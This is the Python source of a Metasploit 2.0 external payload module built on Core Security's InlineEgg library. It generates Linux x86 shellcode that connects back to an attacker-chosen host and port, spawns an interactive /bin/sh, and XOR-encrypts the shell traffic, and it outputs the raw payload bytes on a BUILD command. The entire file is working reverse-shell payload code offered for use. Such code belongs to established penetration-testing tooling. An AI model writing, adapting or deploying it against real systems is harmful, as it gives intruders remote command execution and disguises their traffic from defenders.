#!/usr/bin/env python
#--
# Copyright (c) 2002,2003 Core Security Technologies, Core SDI Inc.
# All rights reserved.
#
#    Unless you have express writen permission from the Copyright Holder, any
# use of or distribution of this software or portions of it, including, but not
# limited to, reimplementations, modifications and derived work of it, in
# either source code or any other form, as well as any other software using or
# referencing it in any way, may NOT be sold for commercial gain, must be
# covered by this very same license, and must retain this copyright notice and
# this license.
#    Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
# THERE IS NO WARRANTY FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE
# LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR
# OTHER PARTIES PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND,
# EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
# ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
# SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
# SERVICING, REPAIR OR CORRECTION.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL
# ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE
# THE SOFTWARE AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
# GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE
# OR INABILITY TO USE THE SOFTWARE (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR
# DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR
# A FAILURE OF THE SOFTWARE TO OPERATE WITH ANY OTHER SOFTWARE), EVEN IF SUCH
# HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
#
# gera [at corest.com]
#--


##
# Modified to work as an external payload for Metasploit Framework 2.0
##

from inlineegg import *
import socket
import struct
import sys


def Info():
    
    opts = {"LHOST" : "127.0.0.1", "LPORT" : 4444, "XKEY" :  55}
    egg = Egg(opts)
    
    print "Name: linx86reverse_xor"
    print "Vers: 1.0"
    print "Desc: Connect back to attacker and spawn an encrypted shell"
    print "Auth: gera[at]corest.com [InlineEgg License]"
    print "Arch: x86"
    print "Priv: 0"
    print "OS:   linux"
    print "Keys: "
    print "Mult: 0"
    print "Type: reverse_shell_xor"
    print "Size: %d" % len(egg)
    print "Opts: LHOST 1 ADDR Local address to receive connection"
    print "Opts: LPORT 1 PORT Local port to receive connection"
    print "Opts: XKEY  1 DATA Byte to xor the connection with"
 
def Egg(opts):

    if not opts.has_key("LHOST") or not opts.has_key("LPORT") or not opts.has_key("XKEY"):
        return

    connect_addr = opts["LHOST"]
    connect_port = int(opts["LPORT"])
    xor_key = int(opts["XKEY"])

    BUFSIZE = 16384
    
    egg = InlineEgg(Linuxx86Syscall)
    
    # connect to other side
    sock = egg.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock = egg.save(sock)
    egg.connect(sock,(connect_addr, connect_port))

    # setup communication with child
    egg.close(0)            # close(0) so next opened fd is 0
    fds = egg.alloc(8)
    child_fd = fds+4
    egg.socketpair(socket.AF_UNIX, socket.SOCK_STREAM, 0, fds.addr())
    egg.dup2(0,1)           # as 0 was closed, we assume socketpair() returns 0 and something
    egg.dup2(0,2)
    egg.fork()

    # fork shell
    child = egg.If('eax','=',0)
    child.close(child_fd)
    child.execve('/bin/sh',('sh','-i',0))
    child.end()

    # proxy from child process to remote peer
    buff  = egg.alloc(BUFSIZE)
    infd  = 'esi'
    outfd = 'edi'

    # move fds to registers
    egg.addCode(egg.micro.set(infd, sock))
    egg.addCode(egg.micro.set(outfd, child_fd))

    # swap registers in one of the childs (so one encrypts and the other decripts)
    enc_pid = egg.fork()
    enc_pid = egg.save(enc_pid)
    child = egg.If('eax','=',0)
    child.addCode('\x87\xf7')         # xchg %esi, %edi
    child.end()

    # main loop (read from one side, encrypt/decrypt, write to the other side)
    w = egg.Do()

    #   read
    nr = egg.read(infd, buff.addr(), BUFSIZE)

    #   end if eof
    eof = egg.If('eax','=',0)
    eof.kill(enc_pid,9)
    eof.exit(0)
    eof.end()

    #   encrypt/decrypt
    egg.addCode(egg.micro.set('ecx',nr))
    egg.addCode(egg.micro.set('ebx',(buff-1).addr()))
    egg.addCode("\x83\x34\x0b")   # xor <keu>, (%ebx, %ecx, 1)
    egg.addCode(chr(xor_key))     # xor key
    egg.addCode("\xe2\xfa")       # loop _xor

    #   write
    nw = egg.write(outfd, buff.addr(), nr)
    w.While(nw, '!=', 0)
    return egg

def main():
    if len(sys.argv) < 2:
        print "Usage: %s <INFO|BUILD> VAR=VAL ..." % sys.argv[0]
        return

    if sys.argv[1] == "INFO":
        Info()

    if sys.argv[1] == "BUILD":
        opts = {}
        for o in sys.argv[2:]:
            x = o.split("=")
            if len(x) == 2:
                opts[x[0]] = x[1]
        egg = Egg(opts)
        if egg != None:
            sys.stdout.write(egg.getCode())

main()
